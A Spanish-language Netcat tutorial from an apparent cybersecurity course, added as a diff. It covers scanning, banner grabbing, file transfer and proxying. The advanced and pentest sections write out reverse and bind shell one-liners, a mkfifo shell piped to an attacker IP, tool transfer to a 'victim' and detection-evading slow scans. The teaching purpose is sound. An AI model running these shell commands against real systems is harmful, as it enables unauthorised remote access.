@@ -1,0 +1,851 @@
+---
+title: "Minicurso: Netcat"
+module: "minicurso-netcat"
+type: "minicurso"
+description: "Tutorial completo de Netcat para networking y seguridad en ciberseguridad"
+---
+
+
+## ¿Qué es Netcat?
+
+Netcat (nc) es conocida como la "navaja suiza del networking". Es una utilidad de línea de comandos que lee y escribe datos a través de conexiones de red usando los protocolos TCP y UDP. Creada originalmente por Hobbit en 1995, netcat es una de las herramientas más versátiles y fundamentales en ciberseguridad.
+
+Netcat puede actuar como cliente o servidor, enviar y recibir datos por cualquier puerto TCP/UDP, crear listeners, transferir archivos, hacer port scanning, y establecer shells remotas. Su simplicidad es su mayor fortaleza: con un solo comando puedes hacer lo que otras herramientas requieren configuraciones complejas para lograr.
+
+En ciberseguridad, netcat se usa para testing manual de servicios, banner grabbing, transferencia rápida de archivos, creación de shells de emergencia, tunneling básico, y como herramienta de diagnóstico de red. Es esencial en cualquier evaluación de seguridad y está presente en prácticamente todas las distribuciones de pentesting.
+
+## ¿Por qué aprenderlo?
+
+- **Versatilidad**: Cliente/servidor TCP/UDP, transferencia de archivos, scanning
+- **Simplicidad**: Un comando, múltiples usos
+- **Universal**: Disponible en Linux, macOS, Windows, BSD
+- **Emergency tool**: Shells remotas, transferencia de archivos sin dependencias
+- **Diagnóstico**: Testing manual de servicios, banner grabbing, port scanning
+
+## Instalación
+
+### macOS
+
+```bash
+# macOS incluye netcat por defecto (versión BSD)
+nc -h 2>&1 | head -3
+# Esperado: usage: nc [-46AacCDdEFhklMnOortUuvz] ...
+
+# Instalar versión GNU (más funcionalidades)
+brew install netcat
+
+# Verificar versión GNU
+gnc -h 2>&1 | head -3
+# O usar ncat (de nmap)
+brew install nmap
+ncat --version
+# Esperado: Ncat version 7.95
+```
+
+::: {.callout-tip}
+## BSD vs GNU vs Ncat
+- **BSD nc** (macOS default): Limitado, sin -e flag
+- **GNU nc** (Linux): Más opciones, soporta -e
+- **Ncat** (Nmap): Versión moderna con SSL, IPv6, proxy support
+- Para este curso, usamos sintaxis compatible con GNU nc y ncat
+:::
+
+### Linux (Ubuntu/Debian)
+
+```bash
+# Instalar netcat tradicional
+sudo apt update
+sudo apt install -y netcat-openbsd
+
+# O instalar ncat (recomendado)
+sudo apt install -y nmap
+# ncat viene incluido con nmap
+
+# Verificar
+nc -h 2>&1 | head -3
+# o
+ncat --version
+```
+
+### Windows
+
+```powershell
+# Windows no incluye netcat nativamente
+# Opción 1: Ncat con Nmap installer
+# Descargar: https://nmap.org/download.html
+# Instalar Nmap (incluye ncat.exe)
+
+# Verificar
+ncat --version
+
+# Opción 2: Usar WSL
+wsl --install
+# Luego en WSL:
+sudo apt install -y netcat-openbsd
+
+# Opción 3: PowerShell equivalente
+# Test-NetConnection -ComputerName host -Port 80
+```
+
+::: {.callout-warning}
+## Aviso Legal y Ético
+Netcat puede usarse para crear shells remotas y transferir datos sin autorización. Usar netcat para acceder a sistemas sin permiso es ILEGAL. Las shells reversas son detectadas por la mayoría de antivirus y sistemas de detección de intrusos. Solo usa netcat en sistemas propios o con autorización explícita.
+:::
+
+## Nivel Básico
+
+### Conceptos Fundamentales
+
+**Listener (servidor)**: Netcat escucha en un puerto esperando conexiones entrantes.
+
+**Client (cliente)**: Netcat se conecta a un host y puerto remoto.
+
+**Banner grabbing**: Conectarse a un servicio para obtener su banner de identificación.
+
+**Port scanning**: Usar netcat para verificar si puertos están abiertos.
+
+**File transfer**: Enviar y recibir archivos a través de conexiones de red.
+
+### Comandos Esenciales
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `nc -l -p <port>` | Escuchar en puerto (listener) | `nc -l -p 4444` |
+| `nc <host> <port>` | Conectar a host:port | `nc 192.168.1.100 80` |
+| `nc -zv <host> <port>` | Port scan (verbose) | `nc -zv 192.168.1.100 1-1000` |
+| `nc -u <host> <port>` | UDP mode | `nc -u 192.168.1.100 53` |
+| `nc -w <sec>` | Timeout | `nc -w 3 192.168.1.100 80` |
+| `nc -n` | Sin DNS resolution | `nc -n -zv 192.168.1.100 80` |
+| `nc -v` | Verbose | `nc -v 192.168.1.100 80` |
+| `nc -vv` | More verbose | `nc -vv 192.168.1.100 80` |
+| `nc -4` | IPv4 only | `nc -4 -l -p 4444` |
+| `nc -6` | IPv6 only | `nc -6 -l -p 4444` |
+| `nc -k` | Keep listening (multiple connections) | `nc -k -l -p 4444` |
+| `ncat --ssl` | SSL/TLS encryption | `ncat --ssl -l -p 4444` |
+| `ncat --listen` | Ncat listen mode | `ncat --listen -p 4444` |
+| `ncat --exec` | Execute command on connect | `ncat --exec /bin/bash -l -p 4444` |
+
+### Modo Listener (Servidor)
+
+```bash
+# Escuchar en un puerto (esperar conexiones)
+nc -l -p 4444
+# Esperado: cursor parpadeando, esperando conexión
+
+# En otra terminal, conectar:
+nc 127.0.0.1 4444
+# Ahora puedes escribir en ambas terminales y ver el texto en ambas
+
+# Listener que acepta múltiples conexiones
+nc -k -l -p 4444
+# -k = keep alive, acepta conexiones después de que una se cierre
+
+# Listener con verbose
+nc -v -l -p 4444
+# Esperado al conectar:
+# Connection from 127.0.0.1 port 4444 [tcp/*] accepted
+```
+
+::: {.callout-warning}
+## Puertos Privilegiados
+Puertos por debajo de 1024 requieren privilegios de root. Para escuchar en puerto 80:
+```bash
+sudo nc -l -p 80
+```
+:::
+
+### Modo Cliente (Conexión)
+
+```bash
+# Conectar a un servicio
+nc 192.168.1.100 80
+# Esperado: conexión establecida, puedes enviar datos
+
+# Conectar con verbose
+nc -v 192.168.1.100 80
+# Esperado:
+# Connection to 192.168.1.100 80 port [tcp/http] succeeded!
+
+# Conectar con timeout
+nc -w 5 192.168.1.100 80
+# Se desconecta después de 5 segundos sin actividad
+
+# Sin resolución DNS (más rápido)
+nc -n -v 192.168.1.100 80
+# No intenta resolver el hostname, solo usa la IP
+```
+
+### Banner Grabbing
+
+```bash
+# Obtener banner de SSH
+nc -v -w 3 192.168.1.100 22
+# Esperado:
+# SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
+
+# Obtener banner de HTTP
+echo -e "GET / HTTP/1.0\r\nHost: target\r\n\r\n" | nc -v -w 3 192.168.1.100 80
+# Esperado: headers HTTP + contenido de la página
+
+# Obtener banner de SMTP
+nc -v -w 3 192.168.1.100 25
+# Esperado: 220 mail.example.com ESMTP Postfix
+
+# Obtener banner de FTP
+nc -v -w 3 192.168.1.100 21
+# Esperado: 220 (vsFTPd 3.0.3)
+
+# Obtener banner de MySQL
+nc -v -w 3 192.168.1.100 3306
+# Esperado: versión de MySQL
+```
+
+::: {.callout-tip}
+## Banner Grabbing Automático
+```bash
+#!/bin/bash
+# banner-grab.sh - Extraer banners de múltiples servicios
+HOST="${1:?Uso: $0 <host>}"
+for port in 21 22 23 25 53 80 110 143 443 445 993 995 3306 3389 5432 8080; do
+    result=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1)
+    if echo "$result" | grep -q "succeeded\|open"; then
+        echo "Port $port: OPEN"
+        echo "$result" | head -3
+    fi
+done
+```
+:::
+
+### Port Scanning
+
+```bash
+# Escanear un solo puerto
+nc -zv 192.168.1.100 80
+# Esperado:
+# Connection to 192.168.1.100 80 port [tcp/http] succeeded!
+
+# Escanear rango de puertos
+nc -zv 192.168.1.100 1-100
+# Esperado: lista de puertos abiertos
+
+# Escanear puertos específicos
+nc -zv 192.168.1.100 22 80 443 3306 8080
+
+# Escanear sin resolver nombres (más rápido)
+nc -n -zv 192.168.1.100 1-1000
+
+# Escanear con timeout corto
+nc -n -zv -w 1 192.168.1.100 1-1000
+
+# Extraer solo puertos abiertos
+nc -n -zv -w 1 192.168.1.100 1-1000 2>&1 | grep "succeeded"
+# Esperado:
+# Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
+# Connection to 192.168.1.100 80 port [tcp/http] succeeded!
+```
+
+### Ejercicio 1: Chat y transferencia de archivos
+
+**Objetivo:** Usar netcat para comunicación bidireccional y transferencia de archivos.
+
+**Paso 1:** Chat entre dos terminales
+
+```bash
+# Terminal 1: Crear listener
+nc -l -p 9999
+# Esperado: cursor esperando
+
+# Terminal 2: Conectar
+nc 127.0.0.1 9999
+# Ahora escribe en cualquiera de las dos terminales
+# El texto aparece en ambas
+
+# Para salir: Ctrl+C en ambas terminales
+```
+
+**Paso 2:** Transferencia de archivos
+
+```bash
+# Terminal 1: Receiver (escuchar y guardar)
+nc -l -p 9999 > received-file.txt
+# Esperado: cursor esperando datos
+
+# Terminal 2: Sender (enviar archivo)
+nc 127.0.0.1 9999 < original-file.txt
+# El archivo se envía y la conexión se cierra
+
+# Terminal 1: Verificar
+cat received-file.txt
+# Debe ser idéntico al original
+
+# Verificar integridad
+md5sum original-file.txt received-file.txt
+# Los hashes deben coincidir
+```
+
+**Paso 3:** Transferencia con verbose
+
+```bash
+# Receiver con verbose
+nc -v -l -p 9999 > received-file.txt
+
+# Sender con verbose
+nc -v 127.0.0.1 9999 < original-file.txt
+# Esperado:
+# Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
+```
+
+## Nivel Intermedio
+
+### File Transfer Avanzado
+
+```bash
+# Transferir directorio completo (comprimido)
+# Sender:
+tar czf - /path/to/directory | nc -l -p 9999
+
+# Receiver:
+nc 192.168.1.100 9999 | tar xzf -
+
+# Transferir con progreso
+# Sender:
+pv large-file.bin | nc -l -p 9999
+# pv muestra progreso de lectura
+
+# Receiver:
+nc 192.168.1.100 9999 | pv > large-file.bin
+# pv muestra progreso de escritura
+
+# Clonar disco por red
+# Sender (desde la máquina con el disco):
+dd if=/dev/sda | nc -l -p 9999
+
+# Receiver (en la máquina destino):
+nc 192.168.1.100 9999 | dd of=/dev/sda
+```
+
+### Banner Grabbing Scripting
+
+```bash
+# Script para banner grabbing de múltiples hosts
+cat > hosts.txt << 'EOF'
+192.168.1.1
+192.168.1.100
+192.168.1.200
+EOF
+
+# Escanear puerto 22 en todos los hosts
+while read host; do
+    echo "=== $host:22 ==="
+    echo "" | nc -w 2 -n "$host" 22 2>&1 | head -1
+done < hosts.txt
+
+# Script completo de banner grabbing
+cat > banner-grab.sh << 'SCRIPT'
+#!/bin/bash
+HOST="${1:?Uso: $0 <host>}"
+PORTS="${2:-21,22,23,25,80,110,143,443,3306,3389,5432,8080}"
+
+echo "=== Banner Grabbing: $HOST ==="
+echo ""
+
+IFS=',' read -ra PORT_ARRAY <<< "$PORTS"
+for port in "${PORT_ARRAY[@]}"; do
+    banner=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1)
+    if echo "$banner" | grep -qi "succeeded\|connected\|open"; then
+        echo "[+] Port $port: OPEN"
+        # Extraer primera línea del banner
+        echo "$banner" | grep -v "succeeded\|connected" | head -1
+        echo ""
+    fi
+done
+SCRIPT
+
+chmod +x banner-grab.sh
+./banner-grab.sh 192.168.1.100
+```
+
+### Simple Proxy con Netcat
+
+```bash
+# Crear un proxy simple con named pipes
+# Redirigir tráfico de puerto local a remoto
+
+# Crear named pipe
+mkfifo /tmp/nc-proxy
+
+# Proxy: local:8080 -> remote:80
+nc -l -p 8080 < /tmp/nc-proxy | nc remote-server 80 > /tmp/nc-proxy
+
+# Ahora conectar a localhost:8080 y el tráfico va a remote-server:80
+
+# Proxy con logging
+nc -l -p 8080 < /tmp/nc-proxy | \
+    tee /tmp/proxy-log.txt | \
+    nc remote-server 80 > /tmp/nc-proxy
+
+# Ver logs
+tail -f /tmp/proxy-log.txt
+```
+
+### UDP Mode
+
+```bash
+# Listener UDP
+nc -u -l -p 5555
+
+# Client UDP
+nc -u 127.0.0.1 5555
+
+# DNS query con UDP
+echo -e "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01" | \
+    nc -u -w 2 8.8.8.8 53 | xxd
+
+# NTP query
+echo -e "\xe3\x00\x04\xfa\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x4f\x23\x4b\x71\x73\x00\x00" | \
+    nc -u -w 2 pool.ntp.org 123 | xxd
+```
+
+### Ncat (Nmap's Netcat)
+
+```bash
+# Ncat es la versión moderna de netcat (incluida en Nmap)
+
+# Listener con SSL
+ncat --ssl -l -p 4444
+
+# Client con SSL
+ncat --ssl 192.168.1.100 4444
+
+# Listener con autenticación
+ncat --listen -p 4444 --allow 192.168.1.0/24
+
+# Client con proxy SOCKS
+ncat --proxy 127.0.0.1:1080 --proxy-type socks5 192.168.1.100 80
+
+# Chat broker (múltiples clientes se ven entre sí)
+ncat --listen -p 4444 --broker
+# Todos los clientes conectados ven lo que escriben los demás
+
+# Con IPv6
+ncat -6 -l -p 4444
+ncat -6 ::1 4444
+
+# Con keep-alive
+ncat --listen -p 4444 --keep-open
+```
+
+::: {.callout-tip}
+## Ncat vs Netcat
+| Feature | Netcat (nc) | Ncat |
+|---------|-------------|------|
+| SSL/TLS | No | Sí |
+| IPv6 | Limitado | Sí |
+| Proxy | No | Sí |
+| Broker | No | Sí |
+| Allow/Deny | No | Sí |
+| Exec (-e) | A veces | Sí |
+:::
+
+### Ejercicio 2: Manual service testing
+
+**Objetivo:** Usar netcat para testear servicios manualmente.
+
+**Paso 1:** Test HTTP manualmente
+
+```bash
+# Conectar a servidor web
+nc -v 192.168.1.100 80
+
+# Enviar petición HTTP manual (escribir línea por línea):
+GET / HTTP/1.1
+Host: 192.168.1.100
+User-Agent: Manual-Test/1.0
+Connection: close
+
+# Presionar Enter dos veces al final
+# Esperado: respuesta HTTP completa con headers y body
+
+# Petición específica
+nc -v 192.168.1.100 80 << EOF
+GET /admin HTTP/1.1
+Host: 192.168.1.100
+Connection: close
+
+EOF
+```
+
+**Paso 2:** Test SMTP manualmente
+
+```bash
+# Conectar a servidor SMTP
+nc -v 192.168.1.100 25
+
+# Dialogo SMTP manual:
+EHLO test.com
+# Esperado: 250-mail.example.com, lista de capacidades
+
+MAIL FROM: <tester@test.com>
+# Esperado: 250 2.1.0 Ok
+
+RCPT TO: <admin@example.com>
+# Esperado: 250 2.1.5 Ok o 550 (rechazado)
+
+QUIT
+# Esperado: 221 Bye
+```
+
+**Paso 3:** Test de servicio personalizado
+
+```bash
+# Conectar a servicio en puerto custom
+nc -v -w 3 192.168.1.100 8080
+
+# Enviar datos y observar respuesta
+echo "HELO" | nc -v -w 3 192.168.1.100 8080
+
+# Enviar múltiples comandos
+{
+    echo "COMMAND1"
+    echo "COMMAND2"
+    echo "QUIT"
+} | nc -v -w 3 192.168.1.100 8080
+```
+
+## Nivel Avanzado
+
+### Reverse Shells
+
+::: {.callout-warning}
+## ADVERTENCIA DE SEGURIDAD
+Las reverse shells son técnicas de explotación. Solo usarlas en entornos de práctica autorizados (CTFs, laboratorios, evaluaciones con permiso). En sistemas reales, las reverse shells son detectadas por antivirus, EDR, y sistemas de monitoreo. Su uso no autorizado es ILEGAL.
+:::
+
+```bash
+# Reverse shell: la víctima conecta de vuelta al atacante
+
+# Attacker (escuchar):
+nc -l -p 4444
+
+# Victim (conectar de vuelta):
+nc 192.168.1.50 4444 -e /bin/bash
+# -e ejecuta /bin/bash cuando se conecta
+
+# Alternativa sin -e (BSD netcat):
+# Victim:
+mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.50 4444 > /tmp/f
+
+# Con Ncat (más funcionalidades):
+# Attacker:
+ncat --ssl -l -p 4444
+
+# Victim:
+ncat --ssl 192.168.1.50 4444 -e /bin/bash
+```
+
+### Bind Shells
+
+```bash
+# Bind shell: la víctima abre un puerto y el atacante conecta
+
+# Victim (abrir puerto con shell):
+nc -l -p 4444 -e /bin/bash
+
+# Attacker (conectar):
+nc 192.168.1.100 4444
+
+# Con Ncat:
+# Victim:
+ncat --ssl -l -p 4444 -e /bin/bash
+
+# Attacker:
+ncat --ssl 192.168.1.100 4444
+```
+
+### Encrypted Tunnels con OpenSSL
+
+```bash
+# Crear túnel encriptado sin ncat --ssl
+
+# Attacker: crear listener SSL
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes
+openssl s_server -accept 4444 -cert cert.pem -key key.pem
+
+# Victim: conectar con SSL
+openssl s_client -connect 192.168.1.50:4444 -quiet
+
+# Túnel bidireccional encriptado
+# Side A:
+openssl s_server -accept 4444 -cert cert.pem -key key.pem -www
+
+# Side B:
+openssl s_client -connect 192.168.1.100:4444 -quiet
+```
+
+### Port Forwarding
+
+```bash
+# Forward local: puerto local -> remoto
+# Todo lo que llegue a localhost:8080 va a remote:80
+mkfifo /tmp/forward
+nc -l -p 8080 < /tmp/forward | nc remote-server 80 > /tmp/forward
+
+# Forward remoto: puerto remoto -> otro remoto
+# Requiere acceso al servidor intermedio
+nc -l -p 8080 | nc target-server 80
+
+# Con ncat (más limpio)
+ncat --listen -p 8080 --sh-exec "ncat target-server 80"
+```
+
+### Scripting con Netcat
+
+```bash
+# Script para verificar múltiples servicios
+cat > service-check.sh << 'SCRIPT'
+#!/bin/bash
+HOST="${1:?Uso: $0 <host>}"
+shift
+PORTS="$*"
+
+echo "=== Service Check: $HOST ==="
+for port in $PORTS; do
+    result=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1)
+    if echo "$result" | grep -qi "succeeded\|connected"; then
+        echo "[+] Port $port: OPEN"
+        # Intentar banner grab
+        banner=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1 | grep -v "succeeded\|connected" | head -1)
+        if [ -n "$banner" ]; then
+            echo "    Banner: $banner"
+        fi
+    else
+        echo "[-] Port $port: CLOSED/FILTERED"
+    fi
+done
+SCRIPT
+
+chmod +x service-check.sh
+./service-check.sh 192.168.1.100 22 80 443 3306 8080
+```
+
+### Ejercicio 3: Network troubleshooting con netcat
+
+**Objetivo:** Usar netcat como herramienta de diagnóstico de red.
+
+**Paso 1:** Verificar conectividad
+
+```bash
+# Test de conectividad básica
+nc -zv -w 3 192.168.1.100 22
+# Si funciona: conexión SSH disponible
+
+# Test sin DNS
+nc -n -zv -w 3 192.168.1.100 80
+# Más rápido, no depende de DNS
+
+# Test de múltiples puertos
+nc -n -zv -w 1 192.168.1.100 22 80 443 3306 5432 8080 2>&1 | grep "succeeded"
+```
+
+**Paso 2:** Test de throughput
+
+```bash
+# Medir velocidad de red
+# Server:
+nc -l -p 9999 > /dev/null
+
+# Client (enviar 100MB de datos aleatorios):
+dd if=/dev/urandom bs=1M count=100 | nc -v 192.168.1.100 9999
+# El tiempo mostrado indica el throughput
+
+# Con pv para ver progreso
+dd if=/dev/urandom bs=1M count=100 | pv | nc -v 192.168.1.100 9999
+```
+
+**Paso 3:** Debug de aplicación
+
+```bash
+# Simular servidor para debug de cliente
+nc -l -p 8080
+# Ahora apunta tu aplicación a localhost:8080
+# Verás las peticiones que envía
+
+# Simular cliente para debug de servidor
+nc -v 192.168.1.100 8080
+# Envía datos manualmente y observa la respuesta del servidor
+
+# Capturar tráfico de aplicación
+nc -l -p 8080 | tee request.log
+# Guarda todas las peticiones recibidas
+```
+
+## Uso en Ciberseguridad
+
+### Escenario 1: Manual service enumeration
+
+```bash
+#!/bin/bash
+# manual-enum.sh - Enumeración manual de servicios
+
+set -euo pipefail
+
+HOST="${1:?Uso: $0 <host>}"
+
+echo "=== Enumeración Manual de Servicios ==="
+echo "Target: $HOST"
+echo ""
+
+# Puertos comunes a verificar
+PORTS="21 22 23 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5432 5900 6379 8080 8443 9200 27017"
+
+for port in $PORTS; do
+    result=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1)
+    if echo "$result" | grep -qi "succeeded\|connected\|open"; then
+        echo "[+] Port $port: OPEN"
+        # Extraer banner si disponible
+        banner=$(echo "" | nc -w 2 -n "$HOST" "$port" 2>&1 | \
+            grep -v "succeeded\|connected\|open" | head -1)
+        if [ -n "$banner" ]; then
+            echo "    Banner: $banner"
+        fi
+    fi
+done
+```
+
+### Escenario 2: Quick file transfer en pentest
+
+```bash
+# Durante un pentest, transferir herramientas al target
+
+# En tu máquina (attacker):
+nc -l -p 4444 < exploit.sh
+
+# En el target (víctima):
+nc 192.168.1.50 4444 > exploit.sh
+chmod +x exploit.sh
+
+# Transferir múltiples archivos (comprimidos)
+# Attacker:
+tar czf tools.tar.gz nmap.sqlmap hydra
+nc -l -p 4444 < tools.tar.gz
+
+# Target:
+nc 192.168.1.50 4444 > tools.tar.gz
+tar xzf tools.tar.gz
+```
+
+### Escenario 3: Port scanning stealth
+
+```bash
+# Escaneo lento para evadir detección
+for port in $(seq 1 1000); do
+    nc -z -w 1 -n 192.168.1.100 "$port" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "Port $port: OPEN"
+    fi
+    sleep 0.5  # 500ms entre cada intento
+done
+
+# Escaneo de puertos específicos con delay
+for port in 22 80 443 3306 8080; do
+    nc -z -w 1 -n 192.168.1.100 "$port" 2>/dev/null && \
+        echo "Port $port: OPEN" || \
+        echo "Port $port: CLOSED"
+    sleep 1
+done
+```
+
+## Referencia Rápida
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `-l -p <port>` | Listener | `nc -l -p 4444` |
+| `<host> <port>` | Connect | `nc 192.168.1.100 80` |
+| `-zv` | Port scan | `nc -zv host 1-1000` |
+| `-u` | UDP mode | `nc -u host 53` |
+| `-w <sec>` | Timeout | `nc -w 3 host 80` |
+| `-n` | No DNS | `nc -n -zv host 80` |
+| `-v/-vv` | Verbose | `nc -v host 80` |
+| `-k` | Keep listening | `nc -k -l -p 4444` |
+| `-e <cmd>` | Execute (GNU) | `nc -l -p 4444 -e /bin/bash` |
+| `--ssl` | SSL (ncat) | `ncat --ssl -l -p 4444` |
+| `--broker` | Chat broker (ncat) | `ncat --listen -p 4444 --broker` |
+| `--allow` | Allow IP (ncat) | `ncat --listen -p 4444 --allow 192.168.1.0/24` |
+| `--exec` | Execute (ncat) | `ncat --exec /bin/bash -l -p 4444` |
+| `-4/-6` | IPv4/IPv6 | `nc -4 -l -p 4444` |
+| `< file` | Send file | `nc host 9999 < file.txt` |
+| `> file` | Receive file | `nc -l -p 9999 > file.txt` |
+
+## Recursos Adicionales
+
+- **Ncat documentation**: https://nmap.org/ncat/
+- **Netcat man page**: `man nc` o `man ncat`
+- **Practice**: https://tryhackme.com/ (labs de networking)
+- **HackTheBox**: https://www.hackthebox.com/ (máquinas con reverse shells)
+- **OverTheWire**: https://overthewire.org/wargames/ (wargames de networking)
+
+## Apéndice: Netcat vs Ncat Comparison
+
+### Feature Comparison
+| Feature | BSD nc | GNU nc | Ncat |
+|---------|--------|--------|------|
+| TCP client/server | Sí | Sí | Sí |
+| UDP support | Sí | Sí | Sí |
+| IPv6 | Limitado | Sí | Sí |
+| SSL/TLS | No | No | Sí |
+| Proxy support | No | No | Sí |
+| Exec (-e) | No | Sí | Sí |
+| Broker mode | No | No | Sí |
+| Allow/Deny rules | No | No | Sí |
+| Source routing | No | No | Sí |
+| Connection timeout | Sí | Sí | Sí |
+
+### Ncat Exclusive Features
+```bash
+# SSL encryption
+ncat --ssl -l -p 4444
+ncat --ssl target 4444
+
+# Chat broker (multi-user chat)
+ncat --listen -p 4444 --broker
+
+# Access control
+ncat --listen -p 4444 --allow 192.168.1.0/24
+ncat --listen -p 4444 --deny 10.0.0.0/8
+
+# Proxy support
+ncat --proxy proxy:8080 --proxy-type http target 80
+ncat --proxy proxy:1080 --proxy-type socks5 target 80
+
+# IPv6
+ncat -6 -l -p 4444
+ncat -6 ::1 4444
+
+# Connection limit
+ncat --listen -p 4444 --max-conns 5
+
+# Keep open (accept multiple connections)
+ncat --listen -p 4444 --keep-open
+```
+
+### Common Netcat Patterns
+```bash
+# Quick HTTP server
+while true; do echo -e "HTTP/1.1 200 OK\n\nHello" | nc -l -p 8080; done
+
+# Port knocking
+for port in 7000 8000 9000; do nc -z -w 1 target $port; done
+
+# Simple load test
+for i in $(seq 1 1000); do echo "request $i" | nc target 80; done
+
+# Network speed test
+# Server:
+nc -l -p 9999 > /dev/null
+# Client:
+dd if=/dev/zero bs=1M count=100 | nc -v server 9999
+```
+
+---
+
+*Minicurso Netcat — Curso Fundamentos de Ciberseguridad — CC BY-SA 4.0*
